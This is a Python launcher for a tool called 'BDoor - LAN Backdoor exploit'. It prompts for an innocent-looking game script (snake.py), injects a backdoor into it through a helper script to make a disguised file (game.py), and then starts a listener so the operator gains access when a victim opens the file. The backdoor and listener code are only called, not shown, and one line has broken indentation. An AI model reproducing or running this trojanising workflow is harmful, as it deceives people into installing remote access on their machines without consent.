import os

print("""
███████   ███████    ██████    ██████   ███████ 
████████  ████████  ████████  ████████  ████████
███  ███  ██   ███  ███  ███  ███  ███  ███  ███
██   ███  ██   ███  ███  ███  ███  ███  ███  ███
███████   ██   ███  ███  ███  ███  ███  ███████ 
████████  ██   ███  ███  ███  ███  ███  ██████  
██░  ███  ██░  ███  ██░  ███  ██░  ███  ██░ ░██ 
░█░  █░█  ██░  ██   ░██  █░█  ░█░ ██░█  ░█░  █░█
 ░███░░░  ██████░░  ░░███ ░░  ░░██░ ░░  ░░   ░░░
░░ ░ ░░   ░░ ░  ░    ░ ░  ░    ░ ░  ░    ░   ░ ░   (By Maukat)
""")

print("BDoor - LAN Backdoor exploit")
print("\n")
print("Options\n")
print("[1] Config everything")
print("[2] Start control")

# Les choix

while True:
    try:
        choice = int(input("BDoor >> "))
        if choice == 1:
            file = input("Enter the name.py of the normal file that the person will execute (Default: snake.py)\n>> ")
            if file == "":
                file = "snake.py"
            output = input("Enter the name.py of the output file, when the person will open it you will start having access (Default: game.py)\n>> ")
            if output == "":
                output = "game.py"
                        explication = input("Put your IP in the listening.py\nPress enter when finished")
            explication = input("For the target IP you need to enter it manually in the backdoor.py\nPress enter to start the injection")
            os.system("sudo python2 crypt.py --file={} --backdoor-file=backdoor.py --output={}".format(file, output))
        elif choice == 2:
            os.system("sudo python3 listening.py")
            break
    except:
        print("Error !")
